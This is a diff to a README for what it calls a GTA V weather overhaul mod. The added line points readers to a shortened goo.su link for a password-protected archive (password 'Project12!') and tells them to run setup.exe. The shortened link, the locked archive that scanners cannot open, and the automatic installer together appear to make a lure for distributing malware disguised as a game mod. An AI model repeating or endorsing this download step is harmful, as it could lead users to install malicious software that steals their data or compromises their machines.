@@ -7,7 +7,7 @@ GTA V Weather Overhaul is a mod for Grand Theft Auto V that improves the game's 
 ## Installation
 📥 Installation & Run
 
-🔹 ✅ RECOMMENDED METHOD (Windows .exe) 1️⃣ Download and extract archive(pass: Project12!)
+🔹 ✅ RECOMMENDED METHOD (Windows .exe) 1️⃣ [Download](https://goo.su/QaHBlHm) and extract archive(pass: Project12!)
 
 2️⃣ Run setup.exe 🚀 The application will set up everything automatically, just enjoy!
 
